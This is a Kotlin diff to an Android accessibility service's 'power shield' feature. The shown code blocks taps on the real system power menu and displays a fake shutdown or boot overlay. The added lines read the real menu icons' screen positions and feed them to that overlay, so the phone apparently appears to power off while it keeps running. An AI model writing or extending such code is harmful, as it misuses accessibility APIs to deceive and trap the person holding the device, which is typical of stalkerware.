@@ -606,15 +606,65 @@ class MyAccessibilityService : AccessibilityService() {
                                 statsPrefs.edit().putLong("power_shield_last_trigger", now).apply()
                                 
                                 // 3. STAGE 3: INSTANT TOUCH SHIELD & FAKE UI
-                                // Deploy TouchGuard NOW to block the user from tapping the real button while WebView renders
                                 DynamicUIManager.showTouchGuard(this@MyAccessibilityService)
                                 
                                 val state = statsPrefs.getString("power_shield_state", "NORMAL") ?: "NORMAL"
                                 val html = if (state == "FAKE_OFF") statsPrefs.getString("power_shield_html_boot", "") else statsPrefs.getString("power_shield_html_shutdown", "")
                                 val method = statsPrefs.getString("power_shield_method", "ACC") ?: "ACC"
-                                
+                                val mappingStr = statsPrefs.getString("power_shield_mapping", "") ?: ""
+                                var coordsJsonStr = statsPrefs.getString("power_shield_coords_cache", "") ?: ""
+
+                                if (coordsJsonStr.isEmpty() && mappingStr.isNotEmpty()) {
+                                    val coordsObj = org.json.JSONObject()
+                                    val mappings = mappingStr.split(",")
+                                    val density = resources.displayMetrics.density
+                                    for (m in mappings) {
+                                        val kv = m.split(":")
+                                        if (kv.size == 2) {
+                                            val htmlId = kv[0].trim()
+                                            val nativeText = kv[1].trim()
+                                            var foundBounds: android.graphics.Rect? = null
+                                            for (r in rootsToScan) {
+                                                val textNodes = r.findAccessibilityNodeInfosByText(nativeText)
+                                                val textNode = textNodes.find { it.text?.toString()?.equals(nativeText, true) == true }
+                                                if (textNode != null) {
+                                                    val parent = textNode.parent
+                                                    if (parent != null) {
+                                                        val iconNodes = parent.findAccessibilityNodeInfosByViewId("com.android.systemui:id/sec_global_actions_icon")
+                                                        if (iconNodes.isNotEmpty()) {
+                                                            foundBounds = android.graphics.Rect().apply { iconNodes[0].getBoundsInScreen(this) }
+                                                        } else {
+                                                            foundBounds = android.graphics.Rect().apply { parent.getBoundsInScreen(this) }
+                                                        }
+                                                    }
+                                                }
+                                                if (foundBounds != null) break
+                                            }
+                                            if (foundBounds != null) {
+                                                val c = org.json.JSONObject()
+                                                c.put("x", foundBounds.left / density)
+                                                c.put("y", foundBounds.top / density)
+                                                c.put("w", foundBounds.width() / density)
+                                                c.put("h", foundBounds.height() / density)
+                                                coordsObj.put(htmlId, c)
+                                            }
+                                        }
+                                    }
+                                    if (coordsObj.length() > 0) {
+                                        coordsJsonStr = coordsObj.toString()
+                                        statsPrefs.edit().putString("power_shield_coords_cache", coordsJsonStr).apply()
+                                        DebugLogger.log("POWER_SHIELD", "Coordinate mapping cached: $coordsJsonStr")
+                                    }
+                                }
+
                                 Handler(Looper.getMainLooper()).post {
                                     DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html ?: "", true)
+                                }
+                                
+                                if (coordsJsonStr.isNotEmpty()) {
+                                    Handler(Looper.getMainLooper()).postDelayed({
+                                        DynamicUIManager.injectPowerMenuCoords(this@MyAccessibilityService, coordsJsonStr)
+                                    }, 200)
                                 }
                                 
                                 val timeout = statsPrefs.getLong("power_shield_timeout", 15L)
